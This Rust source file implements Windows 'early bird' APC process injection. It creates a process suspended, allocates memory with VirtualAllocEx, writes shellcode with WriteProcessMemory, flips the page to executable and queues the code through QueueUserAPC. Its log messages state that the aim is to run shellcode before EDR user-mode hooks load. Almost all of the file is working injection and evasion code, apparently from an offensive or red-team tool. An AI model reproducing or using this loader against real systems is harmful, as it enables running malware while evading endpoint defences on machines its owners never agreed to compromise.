use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(
    shellcode: &[u8],
    target_exe: &str,
    log: &LogSink,
) -> Result<InjectionResult, String> {
    use super::wrappers::wrap_for_apc;
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
        PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateProcessW, QueueUserAPC, ResumeThread, TerminateProcess, CREATE_SUSPENDED,
        PROCESS_INFORMATION, STARTUPINFOW,
    };

    let wrapped = wrap_for_apc(shellcode);
    let size = wrapped.len();

    log.step(format!(
        "[1/6] CreateProcessW(\"{}\") — CREATE_SUSPENDED",
        target_exe
    ));

    let mut target_wide: Vec<u16> = target_exe.encode_utf16().collect();
    target_wide.push(0);

    let mut si: STARTUPINFOW = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    let created = unsafe {
        CreateProcessW(
            None,
            windows::core::PWSTR(target_wide.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi,
        )
    };
    if let Err(e) = created {
        return Err(format!(
            "CreateProcessW failed: {e} — check that \"{}\" exists and is executable",
            target_exe
        ));
    }
    log.info(format!(
        "      spawned suspended process PID {} (main thread TID {})",
        pi.dwProcessId, pi.dwThreadId
    ));

    let process = pi.hProcess;
    let thread = pi.hThread;

    let cleanup_kill = |log: &LogSink| {
        log.detail("[cleanup] TerminateProcess — killing spawned process");
        unsafe {
            let _ = TerminateProcess(process, 1);
            let _ = CloseHandle(thread);
            let _ = CloseHandle(process);
        }
    };

    log.step(format!(
        "[2/6] VirtualAllocEx — MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE ({} bytes)",
        size
    ));
    let base = unsafe {
        VirtualAllocEx(
            process,
            None,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if base.is_null() {
        cleanup_kill(log);
        return Err("VirtualAllocEx returned NULL — allocation failed".to_string());
    }
    log.info(format!(
        "      allocated RW region at remote address {:#p} ({} bytes)",
        base, size
    ));

    log.step(format!("[3/6] WriteProcessMemory — {} bytes", size));
    let mut written: usize = 0;
    if let Err(e) = unsafe {
        WriteProcessMemory(
            process,
            base as *const core::ffi::c_void,
            wrapped.as_ptr() as *const core::ffi::c_void,
            size,
            Some(&mut written),
        )
    } {
        unsafe {
            let _ = VirtualFreeEx(process, base, 0, MEM_RELEASE);
        }
        cleanup_kill(log);
        return Err(format!("WriteProcessMemory failed: {e}"));
    }
    log.info(format!("      wrote {} bytes", written));

    log.step("[4/6] VirtualProtectEx — PAGE_READWRITE -> PAGE_EXECUTE_READ");
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    if let Err(e) = unsafe {
        VirtualProtectEx(
            process,
            base as *const core::ffi::c_void,
            size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    } {
        unsafe {
            let _ = VirtualFreeEx(process, base, 0, MEM_RELEASE);
        }
        cleanup_kill(log);
        return Err(format!("VirtualProtectEx failed: {e}"));
    }
    log.info(format!(
        "      remote page is now PAGE_EXECUTE_READ (previous protection: {:#x})",
        old_protect.0
    ));

    log.step("[5/6] QueueUserAPC — queuing to suspended main thread");
    let apc_func = Some(unsafe {
        core::mem::transmute::<*mut core::ffi::c_void, unsafe extern "system" fn(usize)>(base)
    });
    if unsafe { QueueUserAPC(apc_func, thread, 0) } == 0 {
        unsafe {
            let _ = VirtualFreeEx(process, base, 0, MEM_RELEASE);
        }
        cleanup_kill(log);
        return Err("QueueUserAPC failed on suspended main thread".to_string());
    }
    log.info("      APC queued to main thread");

    log.step("[6/6] ResumeThread — thread initializes, APC fires before EDR hooks install");
    let _ = unsafe { ResumeThread(thread) };
    let _ = unsafe { CloseHandle(thread) };
    let _ = unsafe { CloseHandle(process) };

    log.info("      main thread resumed — APC fires during process init");
    log.warning("      shellcode runs BEFORE EDR user-mode hooks are established");
    log.info(format!(
        "      shellcode at remote address {:#p} ({} bytes, wrapped {}+38)",
        base,
        size,
        size - 38
    ));
    Ok(InjectionResult {
        remote_base: base as u64,
        size,
    })
}

#[cfg(not(windows))]
pub fn live_inject(
    _shellcode: &[u8],
    _target_exe: &str,
    _log: &LogSink,
) -> Result<InjectionResult, String> {
    Err("live injection requires Windows — this build is running on a non-Windows host".to_string())
}
